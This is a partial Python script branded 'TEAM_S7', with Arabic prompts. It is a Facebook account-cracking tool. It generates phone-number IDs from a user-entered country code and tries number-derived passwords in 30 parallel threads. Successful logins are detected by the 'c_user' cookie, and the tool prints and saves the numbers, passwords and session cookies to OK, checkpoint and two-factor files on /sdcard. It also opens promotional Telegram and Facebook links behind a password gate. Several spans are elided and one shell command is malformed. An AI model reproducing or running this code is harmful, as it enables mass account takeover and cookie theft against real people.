import webbrowser
webbrowser.open(' https://t.me/tems7_t' )
...
E = "\033[0;90m" #رمادي
# = = = = = = = = = = = =
print(R+ "꧁ماهوا اسم التيم꧂")
pss = input(G+ " اكتب كلمة السر يقلب ")

if pss ==yso:
 print(L+ " كلمه المرور صحيحه اهلا بك في ادات التيم🔥")
 time.sleep(2)
 os.system('clear')
else:
...
def heroess():
    ...
    for i in range(50):
        ...
        os.system('clear')
        webbrowser.open('')
        sys.stdout.write(f"\r {random_color}\033[1;91mجـاري التـحـقق... " + anim[i % len(anim)] +"\x1b[0m ")
        sys.stdout.write(f"\r {random_color}\033[1;92mجـاري التـحـقق" + am[i % len(am)] +"\x1b[0m ")
        sys.stdout.flush()
heroess()
oks = []
user_ID = []
...
try:
    ...
    os.system("xdg-open os.system('am start https://www.facebook.com/profile.php?id=100089147156284&mibextid=ZbWKwL')")
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  𝐓𝐄𝐀𝐌_𝐒7   \033[0;m] ')
    print(f"")
    print(f"{YELLOW}[01] {GREEN} 𝐸𝑁𝑇𝑅𝑌 𝑂𝐹 𝑇𝑂𝑂𝐿𝑆 ♕")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  𝐓𝐄𝐀𝐌_𝐒7 \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42m 𝐸𝑁𝑇𝐸𝑅 :👇  \033[0;m]")
    print(f"")
    print('𝐴 𝑆𝑃𝐸𝐶𝐼𝐴𝐿 𝐶𝑂𝑈𝑁𝑇𝑅𝑌 𝐶𝑂𝐷𝐸 ')
    print(f"")
    linex()
    code = input('  𝐸𝑁𝑇𝐸𝑅 ')
    os.system("clear")
    ...
    print(f"          \x1b[97m[\033[37;41m   𝐓𝐄𝐀𝐌_𝐒7   \033[0;m]")
    print(f"")
    limit =int(input('𝐶𝐻𝑂𝑂𝑆𝐸: 𝟏𝟎𝟎𝟎, 𝟐𝟎𝟎𝟎, 𝟓𝟎𝟎𝟎, 𝟏𝟎𝟎𝟎𝟎\n\n𝐸𝑁𝑇𝐸𝑅: '))
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {RED}𝐸𝑋𝐴𝑀𝐼𝑁𝐴𝑇𝐼𝑂𝑁   ❤      {GREEN}"+tl)
        
    
        print(f" {BLUE}𝒀𝑂𝑈𝑅 𝐶𝑂𝑈𝑁𝑇𝑅𝑌 𝐶𝑂𝐷𝐸   ❤      {GREEN}"+code)
        
        
        print(f" {BLUE}𝑾𝐴𝐼𝑇 𝐹𝑂𝑅 𝑇𝐻𝐸 𝐸𝑋𝐴𝑀𝐼𝑁𝐴𝑇𝐼𝑂𝑁")
        print(f'{YELLOW}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
        for love in user:
            uid = code+love
            pwx = [love]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;33m[√]---------------------[ 𝐎 𝐊 ]--------------------[√]\n𝐍𝐔𝐌𝐁𝐄𝐑 : '+uid+'\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/𝐓𝐄𝐀𝐌_𝐒7-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                Red = '\033[1;30m'
                print(f'\r{Red}[×]--------------------[ 𝐂 𝐏 ]---------------------[×]\n𝐍𝐔𝐌𝐁𝐄𝐑 : '+uid+'\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/𝐓𝐄𝐀𝐌_𝐒7.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/𝐓𝐄𝐀𝐌_𝐒7-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐓𝐄𝐀𝐌_𝐒7] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
